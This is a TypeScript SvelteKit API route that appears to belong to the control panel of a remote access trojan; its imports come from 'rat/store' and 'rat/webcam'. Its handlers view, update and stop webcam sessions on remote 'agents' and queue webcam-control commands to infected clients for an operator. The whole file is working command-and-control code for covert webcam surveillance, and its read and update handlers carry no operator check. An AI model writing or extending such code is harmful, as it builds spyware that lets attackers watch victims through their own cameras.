import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { requireOperator } from '$lib/server/authorization';
import { registry, RegistryError } from '$lib/server/rat/store';
import { webcamControlManager, WebcamControlError } from '$lib/server/rat/webcam';
import type { WebcamCommandPayload } from '$lib/types/webcam';

export const GET: RequestHandler = ({ params }) => {
	const clientId = params.clientId;
	const sessionId = params.sessionId;
	if (!clientId || !sessionId) {
		throw error(400, 'Missing agent or session identifier');
	}

	const session = webcamControlManager.getSession(clientId, sessionId);
	if (!session) {
		throw error(404, 'Webcam session not found');
	}
	return json(session);
};

export const DELETE: RequestHandler = ({ params, locals }) => {
	const clientId = params.clientId;
	const sessionId = params.sessionId;
	if (!clientId || !sessionId) {
		throw error(400, 'Missing agent or session identifier');
	}

	const operator = requireOperator(locals.user);
	const session = webcamControlManager.getSession(clientId, sessionId);
	if (!session) {
		throw error(404, 'Webcam session not found');
	}

	const command: WebcamCommandPayload = {
		action: 'stop',
		sessionId
	};

	try {
		registry.queueCommand(
			clientId,
			{ name: 'webcam-control', payload: command },
			{ operatorId: operator.id }
		);
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue webcam stop command');
	}

	webcamControlManager.updateSession(clientId, sessionId, { status: 'stopped' });
	webcamControlManager.deleteSession(clientId, sessionId);
	return json({ stopped: true });
};

export const PATCH: RequestHandler = async ({ params, request }) => {
	const clientId = params.clientId;
	const sessionId = params.sessionId;
	if (!clientId || !sessionId) {
		throw error(400, 'Missing agent or session identifier');
	}

	let payload: {
		status?: 'pending' | 'active' | 'stopped' | 'error';
		error?: string | null;
		negotiation?: WebcamCommandPayload['negotiation'] | null;
	};
	try {
		payload = (await request.json()) as typeof payload;
	} catch {
		throw error(400, 'Invalid webcam session payload');
	}

	try {
		const updated = webcamControlManager.updateSession(clientId, sessionId, {
			status: payload.status,
			error: payload.error ?? undefined,
			negotiation: payload.negotiation ?? undefined
		});
		return json(updated);
	} catch (err) {
		if (err instanceof WebcamControlError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to update webcam session');
	}
};
